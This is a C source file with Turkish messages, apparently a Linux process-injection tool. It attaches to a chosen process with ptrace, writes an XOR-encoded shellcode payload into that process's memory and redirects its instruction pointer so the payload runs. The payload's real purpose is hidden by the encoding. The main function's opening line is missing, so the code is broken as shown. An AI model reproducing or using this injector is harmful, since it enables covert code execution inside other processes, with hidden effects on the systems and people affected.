#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>


unsigned char shellcode[] = {
    0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xf3, 0xff, 0xff, 0xff,
    0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x96,
    0x96, 0x49, 0x1a, 0x37, 0x7f, 0x33, 0x1f, 0x48, 0x31, 0x58,
    0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0xde,
    0x2e, 0x66, 0x78, 0x5e, 0x11, 0x1c, 0x6c, 0xfe, 0x96, 0xd0,
    0x4a, 0x63, 0x20, 0x61, 0x79, 0xfe, 0xbb, 0x2a, 0x4e, 0x69,
    0x2d, 0xdb, 0x5f, 0x96, 0x96, 0x49, 0x35, 0x55, 0x16, 0x5d,
    0x30, 0xf4, 0xf7, 0x3a, 0x72, 0x17, 0x52, 0x50, 0x3f, 0xb1,
    0xb9, 0x2b, 0x73, 0x59, 0x50, 0x51, 0x7e, 0xe5, 0xfe, 0x69,
    0x37, 0x5e, 0x5f, 0x0d, 0x39, 0xb6, 0xb9, 0x2d, 0x7f, 0x41,
    0x50, 0x47, 0x7c, 0xe6, 0xb9, 0x78, 0x23, 0x05, 0x51, 0x02,
    0x29, 0xae, 0xb8, 0x78, 0x34, 0x06, 0x4f, 0x07, 0x30, 0xaf,
    0xa6, 0x79, 0x2b, 0x17, 0x4f, 0x0d, 0x39, 0xa7, 0xb1, 0x49,
    0x4c, 0x60, 0x2b, 0x6d, 0x75, 0xad, 0xce, 0x46, 0x1f, 0x37,
    0x7f, 0x33, 0x1f
};


int inject_shellcode(pid_t pid, void *remote_addr, void *data, size_t size) {
    size_t i;
    for (i = 0; i < size; i += sizeof(long)) {
        long chunk;
        memcpy(&chunk, (char *)data + i, sizeof(long));
        if (ptrace(PTRACE_POKETEXT, pid, (void *)((char *)remote_addr + i), (void *)chunk) == -1) {
            perror("[-] PTRACE_POKETEXT başarısız");
            return -1;
        }
    }
    return 0;
}


    if (argc != 3) {
        printf("Kullanım: %s <PID> <TARGET_ADDRESS>\n", argv[0]);
        return 1;
    }

    pid_t target_pid = atoi(argv[1]);
    void *target_addr = (void *)strtoull(argv[2], NULL, 16);
    struct user_regs_struct regs;

    printf("[*] PID: %d, Target Address: %p\n", target_pid, target_addr);


    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("[-] PTRACE_ATTACH başarısız");
        return 1;
    }
    waitpid(target_pid, NULL, 0);
    printf("[+] Süreç durduruldu.\n");


    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) == -1) {
        perror("[-] PTRACE_GETREGS başarısız");
        return 1;
    }


    if (inject_shellcode(target_pid, target_addr, shellcode, sizeof(shellcode)) == -1) {
        perror("[-] Shellcode yazılamadı");
        return 1;
    }
    printf("[+] Shellcode başarıyla yazıldı: %p\n", target_addr);


    regs.rip = (unsigned long)target_addr;
    if (ptrace(PTRACE_SETREGS, target_pid, NULL, &regs) == -1) {
        perror("[-] PTRACE_SETREGS başarısız");
        return 1;
    }
    printf("[+] RIP başarıyla değiştirildi -> %p\n", target_addr);


    if (ptrace(PTRACE_DETACH, target_pid, NULL, NULL) == -1) {
        perror("[-] PTRACE_DETACH başarısız");
        return 1;
    }
    printf("[+] Süreç devam ettirildi.\n");

    return 0;
}
